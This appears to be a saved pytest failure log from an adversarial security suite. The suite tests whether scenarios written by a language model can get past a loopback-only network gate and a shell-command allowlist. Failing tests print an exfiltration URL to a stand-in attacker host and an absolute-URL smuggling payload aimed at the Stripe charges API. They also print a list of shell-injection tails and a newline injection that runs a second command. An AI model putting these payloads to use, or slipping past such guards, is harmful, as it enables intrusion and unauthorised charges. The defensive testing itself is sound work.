@@ -1,0 +1,230 @@
+.....................................FF................................. [ 61%]
+.....................F.................F.....F                           [100%]
+=================================== FAILURES ===================================
+__________ test_B11_ATTACK_absolute_url_smuggled_through_request_path __________
+
+tmp_path = PosixPath('/private/var/folders/b0/6h_5p8v179n_z4v6ngf9n_540000gn/T/pytest-of-sammyfammy/pytest-52/test_B11_ATTACK_absolute_url_s0')
+trace = <test_r3_adversarial.Trace object at 0x1071c9450>
+
+    def test_B11_ATTACK_absolute_url_smuggled_through_request_path(
+        tmp_path: Path, trace: Trace
+    ) -> None:
+        """*** The `path` field is never host-checked, and the executor honours an
+        absolute URL placed in it. ***
+    
+        scenario_validation._check_safety only calls _local_url_problem on
+        `request.url`. When `url` is empty it merely checks that a base app_url
+        exists — the `path` string itself is never parsed. scenarios._join_url then
+        returns `path` verbatim when it starts with http:// or https://.
+        """
+        external = "http://attacker.invalid/exfil?data=1"
+        planner = plan_hostile(
+            tmp_path,
+            raw_scenario(
+                actions=[
+                    {
+                        "kind": "request",
+                        "name": "exfil",
+                        "request": {"method": "POST", "path": external, "expect_status": 200},
+                    }
+                ]
+            ),
+        )
+        admitted = [s.id for s in planner.plan.scenarios]
+        if not admitted:
+            assert_refused(planner, "B11 absolute URL in request.path", external)
+            return
+    
+        # It validated and compiled. Now prove it reaches the network layer verbatim.
+        run_suite(planner, tmp_path)
+        assert external in trace.http, f"expected {external} at the HTTP layer, saw {trace.http}"
+        record(
+            "B11 absolute URL smuggled via request.path",
+            external,
+            "EXECUTED (reached the HTTP client verbatim)",
+            "validation only host-checks request.url (scenario_validation.py:331); "
+            "scenarios._join_url returns an absolute path verbatim (scenarios.py:910)",
+        )
+>       pytest.fail(
+            "CRITICAL: model-authored text produced an external HTTP request. "
+            f"URL handed to the HTTP client: {external}"
+        )
+E       Failed: CRITICAL: model-authored text produced an external HTTP request. URL handed to the HTTP client: http://attacker.invalid/exfil?data=1
+
+tests/test_r3_adversarial.py:424: Failed
+____________ test_B12_ATTACK_absolute_url_in_parallel_request_path _____________
+
+tmp_path = PosixPath('/private/var/folders/b0/6h_5p8v179n_z4v6ngf9n_540000gn/T/pytest-of-sammyfammy/pytest-52/test_B12_ATTACK_absolute_url_i0')
+trace = <test_r3_adversarial.Trace object at 0x10710f5c0>
+
+    def test_B12_ATTACK_absolute_url_in_parallel_request_path(tmp_path: Path, trace: Trace) -> None:
+        external = "https://api.stripe.com/v1/charges"
+        planner = plan_hostile(
+            tmp_path,
+            raw_scenario(
+                actions=[
+                    {
+                        "kind": "parallel_requests",
+                        "requests": [
+                            {"method": "POST", "path": "/approve"},
+                            {"method": "POST", "path": external},
+                        ],
+                    }
+                ]
+            ),
+        )
+        if not planner.plan.scenarios:
+            assert_refused(planner, "B12 absolute URL in parallel request.path", external)
+            return
+        run_suite(planner, tmp_path)
+        assert external in trace.http
+        record(
+            "B12 absolute URL in parallel_requests[].path",
+            external,
+            "EXECUTED (reached the HTTP client verbatim)",
+            "same hole as B11, via the parallel path",
+        )
+>       pytest.fail(f"CRITICAL: external URL {external} reached the HTTP client via request.path")
+E       Failed: CRITICAL: external URL https://api.stripe.com/v1/charges reached the HTTP client via request.path
+
+tests/test_r3_adversarial.py:457: Failed
+____________ test_J1_PROOF_request_path_bypasses_the_loopback_gate _____________
+
+    def test_J1_PROOF_request_path_bypasses_the_loopback_gate() -> None:
+        """validate_scenario returns ZERO reasons; the URL reaches the client verbatim.
+    
+        scenario_validation._check_safety host-checks only ``request.url``
+        (scenario_validation.py:330-347). When ``url`` is empty it merely asserts a
+        base app_url exists — the ``path`` string itself is never parsed. The
+        executor's scenarios._join_url (scenarios.py:907-912) returns ``path``
+        verbatim when it starts with http:// or https://, and runner.http_request
+        (runner.py:254) calls urllib.request.urlopen with no host restriction.
+        """
+        external = "https://api.stripe.com/v1/charges"
+        hostile = make_scenario(
+            "ssrf",
+            actions=[
+                GeneratedAction(
+                    kind="request",
+                    request=GeneratedRequest(
+                        method="POST",
+                        path=external,
+                        headers={"X-Api-Key": "live"},
+                        json_body={"amount": 100000},
+                        expect_status=200,
+                    ),
+                )
+            ],
+        )
+        reasons = validate_scenario(hostile, validation_context())
+        compiled = compile_to_scenario(
+            hostile, base=base_scenario(), approved_commands={APPROVED_STATE, APPROVED_CLEANUP}
+        )
+        spec = compiled.steps[0].request
+        final = scenarios_mod._join_url(base_scenario().app_url, spec.path)
+        PROOFS.append(
+            {
+                "finding": "F-1 external HTTP effect via GeneratedRequest.path",
+                "payload": external,
+                "validate_scenario_reasons": reasons,
+                "compiled_request_path": spec.path,
+                "compiled_request_method": spec.method,
+                "compiled_headers": spec.headers,
+                "url_handed_to_http_client": final,
+                "control_that_should_have_stopped_it": "scenario_validation.py:330-347",
+                "hole": "scenarios.py:907-912 _join_url returns an absolute path verbatim",
+            }
+        )
+        assert reasons == [], f"expected the validator to pass it; got {reasons}"
+        assert final == external
+>       pytest.fail(f"CRITICAL: model-authored text produces an external request to {final}")
+E       Failed: CRITICAL: model-authored text produces an external request to https://api.stripe.com/v1/charges
+
+tests/test_r3_proofs.py:90: Failed
+_________________ test_K3_shell_composition_character_coverage _________________
+
+    def test_K3_shell_composition_character_coverage() -> None:
+        """Enumerate which composition characters the tail filter actually catches."""
+        approved = ApprovedCommands(["./probe.sh payments"])
+        probes = {
+            "semicolon": "; id",
+            "and": " && id",
+            "or": " || id",
+            "pipe": " | id",
+            "background": " & id",
+            "backtick": " `id`",
+            "dollar-paren": " $(id)",
+            "redirect-out": " > /tmp/x",
+            "redirect-append": " >> /tmp/x",
+            "redirect-in": " < /tmp/x",
+            "newline": "\nid",
+            "carriage-return": "\rid",
+            "subshell-parens": " (id)",
+            "brace-group": " { id; }",
+            "process-substitution": " =(id)",
+            "bare-dollar-var": " $HOME",
+            "double-ampersand-encoded": " \\&\\& id",
+            "plain-argument": " --flag=value",
+        }
+        table = {}
+        for label, tail in probes.items():
+            ok, why = approved.approves("./probe.sh payments" + tail)
+            table[label] = {"tail": tail, "approved": ok, "reason": why[:120]}
+        RESULTS.append({"shell_composition_matrix": table})
+        # Everything that composes a *second command* must be refused.
+        for label in (
+            "semicolon",
+            "and",
+            "or",
+            "pipe",
+            "background",
+            "backtick",
+            "dollar-paren",
+            "redirect-out",
+            "redirect-append",
+            "redirect-in",
+            "newline",
+        ):
+>           assert not table[label]["approved"], f"{label} tail was APPROVED: {table[label]}"
+E           AssertionError: newline tail was APPROVED: {'tail': '\nid', 'approved': True, 'reason': ''}
+E           assert not True
+
+tests/test_r3_guard_authority.py:126: AssertionError
+_________________ test_L4_the_shell_really_runs_both_commands __________________
+
+tmp_path = PosixPath('/private/var/folders/b0/6h_5p8v179n_z4v6ngf9n_540000gn/T/pytest-of-sammyfammy/pytest-52/test_L4_the_shell_really_runs_0')
+
+    def test_L4_the_shell_really_runs_both_commands(tmp_path: Path) -> None:
+        """Non-destructive confirmation that a newline separates commands in sh.
+    
+        Uses the real ProcessRunner with a harmless payload — two `echo`s joined by
+        the same newline the validator permits. Nothing is written outside tmp_path
+        and no network is touched.
+        """
+        marker_dir = tmp_path / "proof"
+        marker_dir.mkdir()
+        payload = "echo FIRST\necho R3-SECOND-COMMAND-RAN"
+        runner = runner_mod.ProcessRunner(marker_dir, default_timeout_s=20)
+        result = asyncio.run(runner.run(payload))
+        FINDING["stage_4_shell_semantics"] = {
+            "payload": payload,
+            "stdout": result.stdout,
+            "both_commands_ran": "FIRST" in result.stdout and "R3-SECOND-COMMAND-RAN" in result.stdout,
+        }
+        assert "FIRST" in result.stdout
+        assert "R3-SECOND-COMMAND-RAN" in result.stdout
+>       pytest.fail(
+            "CRITICAL: a newline in an approved command's tail survives validation "
+            "(normalisation collapses it before the shell-composition filter sees it) "
+            "and asyncio.create_subprocess_shell executes it as a second command."
+        )
+E       Failed: CRITICAL: a newline in an approved command's tail survives validation (normalisation collapses it before the shell-composition filter sees it) and asyncio.create_subprocess_shell executes it as a second command.
+
+tests/test_r3_newline_injection.py:223: Failed
+=========================== short test summary info ============================
+FAILED tests/test_r3_adversarial.py::test_B11_ATTACK_absolute_url_smuggled_through_request_path
+FAILED tests/test_r3_adversarial.py::test_B12_ATTACK_absolute_url_in_parallel_request_path
+FAILED tests/test_r3_proofs.py::test_J1_PROOF_request_path_bypasses_the_loopback_gate
+FAILED tests/test_r3_guard_authority.py::test_K3_shell_composition_character_coverage
+FAILED tests/test_r3_newline_injection.py::test_L4_the_shell_really_runs_both_commands
+5 failed, 113 passed in 3.06s
